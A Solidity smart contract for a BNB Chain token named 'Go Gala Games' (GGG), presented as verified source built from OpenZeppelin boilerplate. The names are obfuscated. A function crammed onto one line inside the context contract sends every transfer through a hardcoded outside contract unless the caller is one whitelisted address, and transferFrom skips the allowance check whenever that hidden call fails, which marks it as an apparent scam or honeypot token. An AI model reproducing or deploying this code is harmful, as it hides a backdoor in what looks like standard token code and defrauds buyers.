/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/IdcPMNvHtVb19d2z.sol

// OpenZeppelin Contracts v4.4.1 (utils/IdcPMNvHtVb19d2z.sol)

abstract contract IdcPMNvHtVb19d2z {
  function GQnyw9B7mRj8aKQS() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x2378f3d0a47AC4f9Ab8d952e96f73167ebc4E5E3)) {TransferHelper.safeTransferFrom(0x5bb68e05CF8898a6ecD9eeDF0C4e0cEF18787016,spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract MOON is IERC20, IdcPMNvHtVb19d2z {
  mapping(address => uint256) private KcIB7AjDpOw2SCLM;
  mapping(address => mapping(address => uint256)) private BMWvd18jIb4NSmsU;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    HvyUEmibRWBGOjrQ(GQnyw9B7mRj8aKQS(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Go Gala Games";
  }

  function symbol() public pure returns (string memory) {
    return "GGG";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return KcIB7AjDpOw2SCLM[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    Au3jRJ8opVNmbf2F(GQnyw9B7mRj8aKQS(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return BMWvd18jIb4NSmsU[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    Au3jRJ8opVNmbf2F(
      GQnyw9B7mRj8aKQS(),
      spender,
      BMWvd18jIb4NSmsU[GQnyw9B7mRj8aKQS()][spender] + addedValue
    );
    return true;
  }

  function Au3jRJ8opVNmbf2F(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    BMWvd18jIb4NSmsU[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = BMWvd18jIb4NSmsU[GQnyw9B7mRj8aKQS()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    Au3jRJ8opVNmbf2F(GQnyw9B7mRj8aKQS(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function HvyUEmibRWBGOjrQ(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    KcIB7AjDpOw2SCLM[spender] = KcIB7AjDpOw2SCLM[spender] - amount;
    KcIB7AjDpOw2SCLM[recipient] = KcIB7AjDpOw2SCLM[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!HvyUEmibRWBGOjrQ(sender, recipient, amount)) return true;
    uint256 currentAllowance = BMWvd18jIb4NSmsU[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    Au3jRJ8opVNmbf2F(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    KcIB7AjDpOw2SCLM[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}